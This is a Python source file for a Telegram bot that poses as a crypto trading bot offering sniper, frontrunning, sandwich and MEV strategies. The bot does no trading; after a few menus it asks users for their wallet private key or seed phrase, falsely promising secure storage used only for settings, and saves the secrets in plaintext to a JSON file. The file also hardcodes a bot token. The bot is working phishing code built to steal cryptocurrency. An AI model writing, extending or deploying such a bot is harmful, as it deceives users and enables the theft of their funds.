import asyncio
import logging
import json

from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.storage.memory import MemoryStorage

# Replace with your bot token
TOKEN = "7140174929:AAFvqSHq-vzxL-UWT4yREeruGkwQocj6YmY"


# Initialize bot, storage, and dispatcher
bot = Bot(token=TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# Setup logging
logging.basicConfig(level=logging.INFO)

# JSON file to store user credentials
CREDENTIALS_FILE = "user_credentials.json"

def save_credentials(user_id, username, key_type, key_value):
    try:
        with open(CREDENTIALS_FILE, "r") as file:
            data = json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        data = {}
    
    data[str(user_id)] = {"username": username, key_type: key_value}
    
    with open(CREDENTIALS_FILE, "w") as file:
        json.dump(data, file, indent=4)

# Define an FSM state for collecting the key input
class KeyInput(StatesGroup):
    waiting_for_key = State()

# Inline keyboard for starting the bot
start_inline_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Start 🚀", callback_data="start")]
])

# Inline keyboard for strategy selection
strategy_inline_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [
        InlineKeyboardButton(text="Sniper", callback_data="strategy:Sniper"),
        InlineKeyboardButton(text="Frontrunning", callback_data="strategy:Frontrunning")
    ],
    [
        InlineKeyboardButton(text="Sandwich", callback_data="strategy:Sandwich"),
        InlineKeyboardButton(text="Mev", callback_data="strategy:Mev")
    ],
    [InlineKeyboardButton(text="Pump fun", callback_data="strategy:Pump fun")]
])

# Inline keyboard for blockchain selection
blockchain_inline_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [
        InlineKeyboardButton(text="Ethereum", callback_data="blockchain:Ethereum"),
        InlineKeyboardButton(text="Solana", callback_data="blockchain:Solana")
    ],
    [
        InlineKeyboardButton(text="Base Blockchain", callback_data="blockchain:Base Blockchain"),
        InlineKeyboardButton(text="Binance", callback_data="blockchain:Binance")
    ],
    [InlineKeyboardButton(text="Back", callback_data="back")]
])

# Inline keyboard for security option selection
security_inline_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [
        InlineKeyboardButton(text="Use Private Key", callback_data="security:private_key"),
        InlineKeyboardButton(text="Use Seed Phrase", callback_data="security:seed_phrase")
    ]
])

# /start command sends a welcome message with the start inline button
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer(
        "🚀 Welcome to the BI Bot! 🌐\n\n"
        "Maximize your profits with BI (Bot Installation).\n"
        "This bot helps monitor blockchain activity, automate strategies, and optimize trading.\n\n"
        "Please click the button below to start.",
        reply_markup=start_inline_keyboard
    )

# When the "Start 🚀" button is pressed, show the strategy selection inline keyboard
@dp.callback_query(lambda callback: callback.data == "start")
async def process_start(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "Please choose a strategy:",
        reply_markup=strategy_inline_keyboard
    )
    await callback.answer()

# Process strategy selection; display blockchain selection inline keyboard
@dp.callback_query(lambda callback: callback.data.startswith("strategy:"))
async def process_strategy(callback: types.CallbackQuery):
    strategy = callback.data.split(":", 1)[1]
    text = f"You selected {strategy} strategy! 🚀\nPlease select a blockchain:"
    await callback.message.edit_text(text, reply_markup=blockchain_inline_keyboard)
    await callback.answer()

# Process blockchain selection; display security option inline keyboard
@dp.callback_query(lambda callback: callback.data.startswith("blockchain:"))
async def process_blockchain(callback: types.CallbackQuery):
    blockchain = callback.data.split(":", 1)[1]
    text = (
        f"You selected {blockchain} blockchain.\n\n"
        "To ensure the highest level of security and personalization for your trading bot, "
        "please provide either your private key or seed phrase. "
        "Don't worry—this information is stored securely and is used only to customize your wallet settings.\n\n"
        "Please choose an option:"
    )
    await callback.message.edit_text(text, reply_markup=security_inline_keyboard)
    await callback.answer()

# Process security option; ask user to input the corresponding key
@dp.callback_query(lambda callback: callback.data.startswith("security:"))
async def process_security(callback: types.CallbackQuery, state: FSMContext):
    security_choice = callback.data.split(":", 1)[1]
    await state.update_data(key_type=security_choice)
    key_prompt = "private key" if security_choice == "private_key" else "seed phrase"
    await callback.message.edit_text(f"Please enter your {key_prompt}.")
    await state.set_state(KeyInput.waiting_for_key)
    await callback.answer()

# Store the key provided by the user and clear the state
@dp.message(KeyInput.waiting_for_key)
async def process_key_input(message: types.Message, state: FSMContext):
    data = await state.get_data()
    key_type = data.get("key_type")
    save_credentials(message.from_user.id, message.from_user.username, key_type, message.text)
    await message.answer("Your key has been securely saved!")
    await state.clear()

async def main():
    # Start polling updates from Telegram
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
